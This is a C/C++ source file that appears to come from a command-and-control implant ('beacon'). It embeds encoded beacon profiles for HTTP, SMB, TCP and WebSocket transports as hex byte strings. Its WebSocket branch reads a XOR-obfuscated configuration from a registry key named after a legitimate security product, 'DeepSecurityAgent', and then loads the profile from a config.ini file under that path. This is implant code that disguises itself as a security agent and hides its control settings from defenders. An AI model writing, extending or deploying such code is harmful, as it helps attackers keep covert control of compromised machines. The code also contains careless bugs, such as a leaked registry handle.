#include "config.h"

//#if defined(BUILD_SVC)
//char* getServiceName()
//{
//	return (char*) "ServiceName";
//}
//#endif
//
#if defined(BEACON_HTTP) 
char* getProfile()
{
    return (char*)"\x11\x01\x00\x00\x0d\xbe\x01\x66\x4f\x5b\x23\x46\xa4\xaa\x8a\x26\x87\x73\x4d\xe0\x61\xc8\x06\x62\x29\x5d\xe2\x2f\x97\x44\x72\xf7\x66\x28\x8f\xd9\xfd\xa9\x90\xfd\xd0\x5c\x9c\xaa\x89\x2c\x35\xd5\x59\x0a\xde\xc5\x78\x92\x20\x0c\x95\x15\x0c\x19\x76\x3d\x4e\x4c\x49\x15\x2e\xdb\x39\x85\xa6\x06\x86\xfb\x88\xbb\x6e\x89\x7d\x7f\x90\x06\xf5\x1b\x61\xfb\x48\xd3\xf2\xe2\x07\x84\x6f\xa8\xab\xb9\xa2\xb5\x42\xae\xba\x5b\x2c\xd0\x44\x7a\xf8\x82\x00\xcd\xff\x31\x73\x49\x14\x2f\x3b\xf3\xad\xe7\x7c\xfe\xcf\x80\x38\xa6\x2a\x43\xd5\x4d\x35\x43\x2e\x6a\xc0\x74\xfa\x03\xa5\x28\xbb\xc1\x97\x24\xa6\xcb\xd9\x8a\xaa\x99\x64\x10\xf6\x0c\xcd\xeb\x49\x29\x43\x1b\x56\xc2\xa5\x80\x38\xe7\x1b\x5d\x50\xfd\xfc\x04\xd1\x81\xaa\x33\x7b\x6b\x5a\xc1\x0a\x31\x67\xdf\xbe\x24\x16\xdc\xef\xc5\x0e\xa6\xed\x16\x06\x38\xb7\xae\x80\xb0\x75\x62\xf1\x9e\x11\x37\xcc\x23\x4c\x2c\xed\xac\x6e\x04\x43\x6a\x32\x02\xd5\x9a\x3d\x7b\x2c\xbb\x8a\xde\x65\x6c\xe2\x8e\xe9\x99\x50\x95\x0b\x72\xab\xfe\x45\xab\xd6\xdc\xd4\x48\x89\xff\x51\x39\x06\x4c\xb5\x49\x20\x91\x83\x2b\x3e\x70\x5f\x30\xd6\x2c\x88\x78\xf8\x96\x99\x83\xcf\x87\xd3\x2e\x2d\xb1\xc6\x8d\x7f\x7f\x14\x09\xb6\x22\x62\xd6\xc6\x1e\x90\x56\x08\x78\x83\x45\x13";


}

unsigned int getProfileSize()
{
	return 293;
}
//
//#elif defined(BEACON_SMB) 
//
//char* getProfile()
//{
//	return (char*)"\x23\x00\x00\x00\x0a\x2f\x31\xaf\x97\x34\x3a\xce\x85\x7c\xaf\x89\x81\xcb\xc1\x09\xd5\xbd\xfb\x40\xfe\x6b\x03\x95\x72\xae\x28\x61\xf0\x90\x6e\x92\x6b\x60\x3d\x5f\x76\x23\x34\x64\x33\x6d\xa0\xb2\x14\x1b\x1c\xf9\xe1\x49\x34";
//}
//
//unsigned int getProfileSize()
//{
//	return 56;
//}
//
//#elif defined(BEACON_TCP) 
//
//char* getProfile()
//{
//	return (char*)"\x14\x00\x00\x00\xdb\x91\x88\xbc\xde\x20\x93\xac\x2b\xca\x1d\x02\xcc\x92\xca\x88\x61\xa3\x33\x32\x25\xde\xcb\x26\xe0\x31\x57\xd0\x85\x4c\xe1\x76\xf5\xab\x89\xdf";
//}
//
//unsigned int getProfileSize()
//{
//	return 41;
//}
//
//

//ws
#elif defined(BEACON_WS)
//char* getProfile()
//{
//	return (char*)"\x43\x00\x00\x00\x29\x12\xce\x5b\x64\xa6\x5a\x46\x0a\xbb\xd1\x94\x2a\x4e\x26\x24\xfc\xab\xdd\x4a\x17\xbd\xfe\xcb\x4a\x21\x86\xd8\xb4\x1e\x84\x2f\xbe\x80\xcb\xd4\x87\x2e\x30\x3a\x5f\xb3\xfc\xc4\x55\x63\x18\xd5\x84\x78\x49\x1d\x6d\x2c\x9f\x2a\x9a\x92\x50\xdf\x14\x61\x91\x82\x06\x41\x59\xe6\xa4\x7e\x01\x4a\x68\x64\x30\x9a\x5a\xed\x7c\xf3\x45\x7b\x50";
//}
//
//unsigned int getProfileSize()
//{
//	return 87;
//}

#include <windows.h>    

struct Config {
    char installPath[MAX_PATH];
    char downloadUrl[2048];
    DWORD updateInterval;
    DWORD lastUpdateTime;

    Config() {
        memset(installPath, 0, sizeof(installPath));
        memset(downloadUrl, 0, sizeof(downloadUrl));
        updateInterval = 60;
        lastUpdateTime = 0;
    }
};


static BYTE* profileData = NULL;
static unsigned int profileSize = 0;


void XorData(void* data, size_t size, char key) {
    unsigned char* byteData = reinterpret_cast<unsigned char*>(data);
    for (size_t i = 0; i < size; ++i) {
        byteData[i] ^= key;
    }
}


bool ReadConfigFromRegistry(Config& outConfig) {
    HKEY hKey;
    LONG result = RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        "SOFTWARE\\DeepSecurityAgent",
        0,
        KEY_READ,
        &hKey
    );

    if (result != ERROR_SUCCESS) {
        return false;
    }

    DWORD bufferSize = sizeof(Config);
    result = RegQueryValueExA(
        hKey,
        "AgentConfig",
        NULL,
        NULL,
        reinterpret_cast<LPBYTE>(&outConfig),
        &bufferSize
    );
    if (result == ERROR_SUCCESS) {
        XorData(&outConfig, sizeof(outConfig), 0xAA);
        return true;
    }

    RegCloseKey(hKey);

    if (result == ERROR_SUCCESS) {
        return true;
    }

    return false;
}




char* getProfile()
{

    Config config;
    ReadConfigFromRegistry(config);
    char installPath[MAX_PATH];
    char* configPath = config.installPath ;
    strcat(config.installPath,"\\config.ini");


    if (profileData == NULL) {
       // const char* configPath = "C:\\ProgramData\\Deep Security Agent\\config.ini";
        HANDLE hFile = CreateFileA(configPath, GENERIC_READ, FILE_SHARE_READ,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

        if (hFile == INVALID_HANDLE_VALUE) {
            return NULL;
        }

        profileSize = GetFileSize(hFile, NULL);
        profileData = (BYTE*)LocalAlloc(LPTR, profileSize);

        DWORD bytesRead;
        ReadFile(hFile, profileData, profileSize, &bytesRead, NULL);
        CloseHandle(hFile);
    }
    return (char*)profileData;
}

unsigned int getProfileSize()
{
    if (profileData == NULL) {
        getProfile();
    }
    return profileSize;
}
//#endif

//#elif defined(BEACON_WS)
//char* getProfile()
//{
//	return (char*)"\x44\x00\x00\x00\x29\x12\xce\x5b\x64\xa6\x5a\x46\x0a\xbc\xd1\x94\x2a\x1b\x76\x6b\xbb\xf4\x85\x19\x17\xe7\xa8\x88\xe3\xaf\x99\xd8\xb0\x1a\x84\x2f\x91\xd8\xcf\xd4\xff\x25\x30\x3a\x12\x91\xe9\xd7\x50\x63\x15\x9b\x9e\x63\x57\x2d\x6d\x2c\x9f\x2a\x9a\x92\x50\xda\x11\x61\x91\x88\x0c\x41\x59\x7e\xe6\xa4\x7e\x01\x4a\x68\x64\x30\x9a\x5a\xed\x7c\xf3\x45\x7b\x50";
//}
//
//unsigned int getProfileSize()
//{
//	return 88;
//}
#endif